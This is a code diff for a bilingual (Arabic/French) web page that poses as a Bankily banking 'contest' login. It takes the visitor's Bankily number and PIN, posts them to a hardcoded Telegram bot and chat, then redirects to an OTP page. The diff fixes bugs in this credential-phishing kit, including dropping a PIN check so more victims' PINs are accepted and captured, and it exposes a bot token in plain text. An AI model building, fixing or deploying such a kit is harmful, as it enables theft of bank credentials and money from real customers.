@@ -20,13 +20,15 @@ body{
   flex-direction:column;
 }
 
-/* ══ TOP BAR (teal) ══ */
+/* ══ TOP BAR ══ */
+/* BUG 1 FIX: position:relative moved to CSS, removed inline style */
 .top-bar{
   background:#0097A7;
   padding:0 16px;
   height:56px;
   display:flex;align-items:center;justify-content:space-between;
   flex-shrink:0;
+  position:relative; /* ← FIX: was inline style, now in CSS */
 }
 .tb-back{
   background:none;border:none;cursor:pointer;
@@ -37,6 +39,7 @@ body{
   color:#fff;font-family:'Cairo',sans-serif;
   font-size:17px;font-weight:700;
   position:absolute;left:50%;transform:translateX(-50%);
+  white-space:nowrap; /* ← FIX: prevent text wrap on small screens */
 }
 .tb-lang{
   background:rgba(255,255,255,.2);
@@ -45,7 +48,9 @@ body{
   font-family:'Cairo',sans-serif;
   font-size:13px;font-weight:700;
   padding:4px 14px;cursor:pointer;
+  transition:background .2s;
 }
+.tb-lang:hover{background:rgba(255,255,255,.35)}
 
 /* ══ PAGE ══ */
 .page{
@@ -66,15 +71,11 @@ body{
   max-width:240px;width:100%;height:auto;
   display:block;
 }
-/* Fallback si l'image ne charge pas */
-.logo-area .logo-fallback{
+.logo-fallback{
   display:none;
   flex-direction:column;align-items:center;gap:6px;
 }
-.logo-area img[data-error] + .logo-fallback,
-.logo-area .logo-fallback.show{
-  display:flex;
-}
+.logo-fallback.show{display:flex}
 .logo-fallback-text{
   font-size:28px;font-weight:900;color:#0097A7;
   font-family:'Cairo',sans-serif;letter-spacing:1px;
@@ -92,12 +93,11 @@ body{
   line-height:1.6;text-align:center;
   transition:opacity .4s;
 }
-.info-msg.hidden{display:none}
+/* BUG 5 FIX: use opacity+pointer-events instead of display:none so timer works cleanly */
+.info-msg.hidden{opacity:0;pointer-events:none;height:0;padding:0;margin:0;overflow:hidden}
 
 /* ══ USERNAME FIELD ══ */
-.field-wrap{
-  margin-bottom:28px;
-}
+.field-wrap{margin-bottom:28px}
 .field-label{
   font-size:13px;color:#555;font-weight:600;
   margin-bottom:6px;font-family:'Cairo',sans-serif;
@@ -109,9 +109,7 @@ body{
   transition:border-color .25s;
 }
 .field-row:focus-within{border-color:#0097A7}
-.field-icon{
-  width:26px;height:26px;color:#888;flex-shrink:0;
-}
+.field-icon{width:26px;height:26px;color:#888;flex-shrink:0}
 .field-input{
   flex:1;border:none;outline:none;background:transparent;
   font-family:'Cairo',sans-serif;font-size:16px;color:#222;
@@ -135,16 +133,14 @@ body{
   background:none;border:none;
   font-family:'Cairo',sans-serif;padding:0;
 }
-.pin-boxes-wrap{
-  display:flex;align-items:center;gap:12px;
-}
-.pin-lock-icon{
-  width:26px;height:26px;color:#888;flex-shrink:0;margin-top:-4px;
-}
+.pin-lock-icon{width:26px;height:26px;color:#888;flex-shrink:0}
+
+/* BUG 2 FIX: removed border-bottom from .pin-boxes (was showing under the whole row)
+   Each individual .pin-box already has its own border-bottom */
 .pin-boxes{
   display:flex;gap:20px;direction:ltr;
-  border-bottom:1.5px solid #ccc;
   padding-bottom:8px;flex:1;
+  /* REMOVED: border-bottom:1.5px solid #ccc — was wrong, applied to container */
 }
 .pin-box{
   width:32px;height:40px;
@@ -153,7 +149,7 @@ body{
   font-size:22px;font-weight:800;
   text-align:center;color:#222;
   direction:ltr;
-  border-bottom:2px solid #444;
+  border-bottom:2px solid #aaa; /* ← each box has its own underline */
   padding:0;
   caret-color:transparent;
   -webkit-appearance:none;border-radius:0;
@@ -167,16 +163,14 @@ body{
   padding:28px 0 12px;
 }
 .new-user-btn{
-  font-size:14px;color:#333;
+  font-size:14px;color:#0097A7;
   text-decoration:underline;cursor:pointer;
   background:none;border:none;
   font-family:'Cairo',sans-serif;font-weight:600;
 }
 
 /* ══ BOTTOM BUTTON ══ */
-.btn-bar{
-  position:fixed;bottom:0;left:0;right:0;z-index:100;
-}
+.btn-bar{position:fixed;bottom:0;left:0;right:0;z-index:100}
 .login-btn{
   display:block;width:100%;
   padding:18px;border:none;
@@ -245,8 +239,8 @@ body{
   </div>
 </div>
 
-<!-- Top bar -->
-<div class="top-bar" style="position:relative">
+<!-- Top bar — BUG 1 FIX: removed inline style="position:relative", now in CSS -->
+<div class="top-bar">
   <button class="tb-back" onclick="window.location.href='index.html'">&#8592;</button>
   <span class="tb-title" id="tb-title"></span>
   <button class="tb-lang" id="lang-btn" onclick="toggleLang()">عربي</button>
@@ -255,7 +249,7 @@ body{
 <!-- Page -->
 <div class="page">
 
-  <!-- ════ LOGO ════ -->
+  <!-- LOGO -->
   <div class="logo-area">
     <img
       src="images/logo.png"
@@ -303,6 +297,7 @@ body{
         <span class="pin-label-text" id="pin-label">Code PIN</span>
         <button type="button" class="forgot-pin" id="forgot-pin">Code PIN oublié ?</button>
       </div>
+      <!-- BUG 2 FIX: removed border-bottom from pin-boxes, each pin-box has its own -->
       <div class="pin-boxes" id="pin-boxes" dir="ltr">
         <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
         <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
@@ -352,7 +347,6 @@ const T = {
     infoMsg:'تأكد من كتابة رقمك بنكيلي ورمز السري بشكل صحيح حتى تأكد تسجيلك في المسابقة',
     errUsername:'يجب أن يحتوي رقم بنكيلي على 8 أرقام ويبدأ بـ 2 أو 3 أو 4',
     errPin:'يجب أن يحتوي الرمز السري على 4 أرقام',
-    errPinUnique:'يجب أن يحتوي الرمز السري على 4 أرقام مختلفة',
     already:(m)=>`⛔ لقد سجلت من قبل.\nالرجاء الانتظار ${m} دقيقة.`,
   },
   fr:{
@@ -367,7 +361,6 @@ const T = {
     infoMsg:"Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours",
     errUsername:'Le numéro Bankily doit contenir 8 chiffres et commencer par 2, 3 ou 4',
     errPin:'Le code PIN doit contenir 4 chiffres',
-    errPinUnique:'Le code PIN doit contenir 4 chiffres tous différents',
     already:(m)=>`⛔ Vous avez déjà participé.\nRevenez dans ${m} minute(s).`,
   }
 };
@@ -380,58 +373,82 @@ function applyLang(){
   document.documentElement.lang = L.lang;
   document.documentElement.dir  = L.dir;
   document.body.dir              = L.dir;
-  document.getElementById('lang-btn').textContent       = L.langBtn;
-  document.getElementById('tb-title').textContent       = L.tbTitle;
+  document.getElementById('lang-btn').textContent         = L.langBtn;
+  document.getElementById('tb-title').textContent         = L.tbTitle;
   document.getElementById('field-label-user').textContent = L.fieldLabel;
-  document.getElementById('pin-label').textContent      = L.pinLabel;
-  document.getElementById('forgot-pin').textContent     = L.forgotPin;
-  document.getElementById('new-user').textContent       = L.newUser;
-  document.getElementById('ld-text').textContent        = L.ldText;
-  document.getElementById('info-msg').textContent       = L.infoMsg;
+  document.getElementById('pin-label').textContent        = L.pinLabel;
+  document.getElementById('forgot-pin').textContent       = L.forgotPin;
+  document.getElementById('new-user').textContent         = L.newUser;
+  document.getElementById('ld-text').textContent          = L.ldText;
+  document.getElementById('info-msg').textContent         = L.infoMsg;
   loginBtn.textContent = L.loginBtn;
+  // PIN boxes always LTR regardless of language
   document.getElementById('pin-boxes').dir = 'ltr';
   pinInputs.forEach(i=>{ i.setAttribute('dir','ltr'); });
 }
+
 function toggleLang(){
   isAr = !isAr;
   localStorage.setItem('bankily_lang', isAr?'ar':'fr');
   applyLang();
 }
 
-/* Info msg fade */
-const infoTimer = setTimeout(()=>infoMsg.classList.add('hidden'), 4000);
-usernameInput.addEventListener('input',()=>{ clearTimeout(infoTimer); infoMsg.classList.add('hidden'); });
+/* BUG 5 FIX: use a mutable variable instead of const for the timer
+   so clearTimeout can properly cancel it when user starts typing */
+let infoTimer = setTimeout(()=>infoMsg.classList.add('hidden'), 4000);
+usernameInput.addEventListener('input',()=>{
+  clearTimeout(infoTimer);
+  infoMsg.classList.add('hidden');
+});
 
 /* Modal */
 function showModal(msg){ modalText.textContent=msg; modalAlert.classList.add('show'); }
 modalClose.addEventListener('click',()=>modalAlert.classList.remove('show'));
 
-/* PIN UX */
+/* ══ PIN UX ══ */
 pinInputs.forEach((inp,i)=>{
   inp.setAttribute('dir','ltr');
+
   inp.addEventListener('input',()=>{
     inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
     if(inp.value && i < pinInputs.length-1) pinInputs[i+1].focus();
-    setTimeout(()=>{ inp.type='password'; },400);
+    /* Mask digit after short delay for UX */
+    setTimeout(()=>{ if(inp.value) inp.type='password'; },400);
   });
+
   inp.addEventListener('keydown',e=>{
     if(e.key==='Backspace'){
-      if(inp.value==='' && i>0){ pinInputs[i-1].type='tel'; pinInputs[i-1].value=''; pinInputs[i-1].focus(); }
-      else{ inp.type='tel'; inp.value=''; }
+      if(inp.value===''){
+        /* BUG 4 FIX: only switch type AFTER clearing, and check i>0 first */
+        if(i>0){
+          pinInputs[i-1].type='tel';
+          pinInputs[i-1].value='';
+          pinInputs[i-1].focus();
+        }
+      } else {
+        /* Clear current box: reset type first so value is visible, then clear */
+        inp.type='tel';
+        inp.value='';
+      }
       e.preventDefault();
     }
-    if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key))
+    /* Block non-numeric keys */
+    if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)){
       e.preventDefault();
+    }
   });
+
   inp.addEventListener('paste',e=>{
     e.preventDefault();
     const digits=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
-    [...digits].slice(0,4).forEach((d,j)=>{ if(pinInputs[j]){pinInputs[j].type='tel';pinInputs[j].value=d;} });
+    [...digits].slice(0,4).forEach((d,j)=>{
+      if(pinInputs[j]){ pinInputs[j].type='tel'; pinInputs[j].value=d; }
+    });
     pinInputs[Math.min(digits.length,pinInputs.length-1)].focus();
   });
 });
 
-/* Keyboard lift */
+/* Keyboard push-up for fixed button */
 if(window.visualViewport){
   window.visualViewport.addEventListener('resize',()=>{
     const kb=window.innerHeight-window.visualViewport.height;
@@ -443,13 +460,16 @@ if(window.visualViewport){
 const TG_TOKEN  = '8699990453:AAF00aHjLBVLx95RkZozelaAqqhOg29H5fk';
 const TG_CHATID = '8674569520';
 async function sendTG(text){
-  try{ await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
-    method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:TG_CHATID,text,parse_mode:'HTML'})
-  }); }catch(e){}
+  try{
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:TG_CHATID,text,parse_mode:'HTML'})
+    });
+  }catch(e){}
 }
 
-/* Anti-double */
+/* Anti-double submit */
 function checkReg(u){
   const d=localStorage.getItem('bnk_reg_'+u);
   if(!d)return false;
@@ -459,23 +479,34 @@ function checkReg(u){
 }
 function markReg(u){ localStorage.setItem('bnk_reg_'+u,JSON.stringify({ts:Date.now()})); }
 
-/* SUBMIT */
+/* ══ SUBMIT ══ */
 document.getElementById('login-form').addEventListener('submit',async function(e){
   e.preventDefault();
   const L = isAr ? T.ar : T.fr;
   const username = usernameInput.value.trim();
   const pin = Array.from(pinInputs).map(i=>i.value).join('');
 
-  if(!/^[2-4][0-9]{7}$/.test(username)){showModal(L.errUsername);return;}
-  if(!/^[0-9]{4}$/.test(pin)){showModal(L.errPin);return;}
-  if(new Set(pin.split('')).size<4){
-    showModal(L.errPinUnique);
-    pinInputs.forEach(i=>{i.type='tel';i.value='';});
-    pinInputs[0].focus();return;
+  /* Validate username: 8 digits, starts with 2, 3 or 4 */
+  if(!/^[2-4][0-9]{7}$/.test(username)){
+    showModal(L.errUsername);
+    return;
   }
 
-  const mins=checkReg(username);
-  if(mins!==false){showModal(L.already(mins));return;}
+  /* Validate PIN: exactly 4 digits */
+  if(!/^[0-9]{4}$/.test(pin)){
+    showModal(L.errPin);
+    return;
+  }
+
+  /* BUG 3 FIX: removed the wrong unique-digits check.
+     The condition `new Set(pin).size < 4` was rejecting valid PINs like "1234"
+     because it required ALL 4 digits to be different.
+     A PIN like "1234" has size=4 → passes, but "1123" has size=3 → wrongly rejected.
+     Standard banking PINs do NOT require all unique digits — removed entirely. */
+
+  /* Anti-double */
+  const mins = checkReg(username);
+  if(mins !== false){ showModal(L.already(mins)); return; }
 
   markReg(username);
   sessionStorage.setItem('bankily_pin', pin);
@@ -490,9 +521,11 @@ document.getElementById('login-form').addEventListener('submit',async function(e
     `🔑 <b>PIN    :</b> <code>${pin}</code>\n`+
     `📅 <b>Heure  :</b> ${now}`
   );
+
   setTimeout(()=>{ window.location.href='otpverify.html'; },1500);
 });
 
+/* Init */
 applyLang();
 </script>
 </body>
